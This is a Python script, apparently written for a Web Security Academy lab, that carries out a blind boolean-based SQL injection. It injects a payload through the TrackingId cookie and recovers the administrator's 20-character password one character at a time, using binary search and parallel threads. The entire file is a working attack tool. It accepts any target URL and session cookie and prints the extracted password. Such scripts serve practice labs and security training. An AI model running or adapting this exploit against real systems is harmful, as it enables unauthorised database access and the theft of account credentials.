import requests
import threading
import sys
import readline  # Enables arrow keys, home, end, history

def get_input(prompt):
    """Get input with full keyboard support using readline"""
    try:
        return input(prompt)
    except EOFError:
        return ''

def check_condition(url, base_tracking_id, session_cookie, pos, operator, value):
    """Send request and check if Welcome exists in response"""
    tracking_id = (
        f"{base_tracking_id}'+AND+"
        f"(SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+"
        f"WHERE+username='administrator'){operator}{value}--"
    )
    cookies = {
        "TrackingId": tracking_id,
        "session": session_cookie
    }
    try:
        r = requests.get(url, cookies=cookies, timeout=10)
        return "Welcome" in r.text
    except:
        return False

def binary_search_char(url, base_tracking_id, session_cookie, pos, password, lock):
    """Find character at given position using binary search on ASCII range"""
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2

        if check_condition(url, base_tracking_id, session_cookie, pos, ">", mid):
            low = mid + 1
        elif check_condition(url, base_tracking_id, session_cookie, pos, "<", mid):
            high = mid - 1
        else:
            char = chr(mid)
            with lock:
                password[pos-1] = char
                print(f"[+] Position {pos:02d}: '{char}' -> {''.join(password)}")
            return

    with lock:
        password[pos-1] = '?'
        print(f"[-] Position {pos:02d}: not found")

def fix_url(url):
    """Auto fix URL - add https:// if missing and trailing slash"""
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith('/'):
        url += '/'
    return url

def validate_url(url):
    """Validate URL format"""
    if not url:
        return False, "URL cannot be empty!"
    if ' ' in url:
        return False, "URL cannot contain spaces!"
    if '.' not in url:
        return False, "Invalid URL format! (e.g. abc123.web-security-academy.net)"
    return True, ""

def validate_cookie(value, name):
    """Validate cookie is not empty"""
    if not value:
        return False, f"{name} cannot be empty!"
    if ' ' in value:
        return False, f"{name} cannot contain spaces!"
    return True, ""

def get_valid_input(prompt, validate_func, *args):
    """Keep asking until valid input is given"""
    while True:
        value = get_input(prompt).strip()
        is_valid, error = validate_func(value, *args)
        if is_valid:
            return value
        print(f"    [!] {error} Please try again.")

def test_connection(url):
    """Test if URL is reachable"""
    try:
        r = requests.get(url, timeout=10)
        return True, r.status_code
    except requests.exceptions.ConnectionError:
        return False, "Cannot connect - check URL"
    except requests.exceptions.Timeout:
        return False, "Connection timed out"
    except requests.exceptions.InvalidURL:
        return False, "Invalid URL format"
    except Exception as e:
        return False, str(e)

def main():
    print("=" * 50)
    print("      Blind SQLi - Binary Search Attack")
    print("=" * 50)
    print()

    try:
        # Get and validate URL
        while True:
            url = get_valid_input("[*] URL        : ", validate_url)
            url = fix_url(url)
            print("[*] Testing connection...")
            ok, result = test_connection(url)
            if ok:
                print(f"[+] Connected! Status: {result}\n")
                break
            else:
                print(f"    [!] {result}")
                print("    [!] Please enter a valid URL.\n")

        # Get and validate TrackingId
        tracking_id = get_valid_input("[*] TrackingId : ", validate_cookie, "TrackingId")

        # Get and validate Session
        session = get_valid_input("[*] Session    : ", validate_cookie, "Session")

        print(f"\n[*] Target : {url}")
        print(f"[*] Searching 20 character password...\n")

        password = ['?'] * 20
        lock = threading.Lock()

        # Launch all 20 positions in parallel threads
        threads = []
        for pos in range(1, 21):
            t = threading.Thread(
                target=binary_search_char,
                args=(url, tracking_id, session, pos, password, lock)
            )
            threads.append(t)
            t.start()

        # Wait for all threads to complete
        for t in threads:
            t.join()

        if '?' in password:
            print("\n[!] Warning: Some positions failed - cookies may have expired!")

        print("\n" + "=" * 50)
        print(f"[*] Final Password: {''.join(password)}")
        print("=" * 50)

    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    main()